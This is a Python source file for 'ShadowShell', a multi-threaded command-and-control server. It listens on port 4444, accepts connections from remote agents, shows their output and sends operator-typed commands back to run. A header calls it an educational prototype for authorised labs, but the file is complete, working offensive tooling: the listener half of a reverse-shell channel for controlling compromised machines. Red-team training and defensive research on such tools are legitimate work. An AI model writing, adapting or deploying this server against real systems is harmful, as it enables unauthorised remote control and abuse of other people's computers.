import socket
import threading
import argparse

# ShadowShell C2 Server (Plaintext Prototype)
# Educational use only. Authorized lab testing only.

def handle_agent(conn, addr):
    print(f"[+] Beacon received from {addr[0]}:{addr[1]}")
    
    # Wrap in a try/except to handle agent disconnects gracefully
    try:
        while True:
            # 1. Wait for the agent's initial check-in or previous command output
            data = conn.recv(4096).decode('utf-8')
            if not data:
                break # Connection closed by agent
            
            print(f"\n[Agent Output]:\n{data}")
            
            # 2. Prompt the operator for the next command
            cmd = input("ShadowShell (cmd)> ")
            if cmd.lower() in ['exit', 'quit']:
                conn.send(b'exit')
                break
            
            # 3. Send the command to the agent
            conn.send(cmd.encode('utf-8'))
            
    except ConnectionResetError:
        print(f"[-] Agent {addr[0]} disconnected abruptly.")
    except Exception as e:
        print(f"[-] Error with agent {addr[0]}: {e}")
    finally:
        print(f"[-] Closing connection to {addr[0]}:{addr[1]}")
        conn.close()

def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    print(f"""
    =============================================
       ShadowShell Educational C2 - Server
       Listening on {host}:{port}
       Waiting for beacons...
       (Press Ctrl+C to exit)
    =============================================
    """)
    
    try:
        while True:
            # Accept incoming agent connections
            agent_conn, agent_addr = server.accept()
            
            # Handle each agent in a new thread so we can manage multiple beacons
            thread = threading.Thread(target=handle_agent, args=(agent_conn, agent_addr))
            thread.start()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")
    finally:
        server.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShadowShell C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="IP to bind to (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=4444, help="Port to listen on (default: 4444)")
    args = parser.parse_args()
    
    start_server(args.host, args.port)
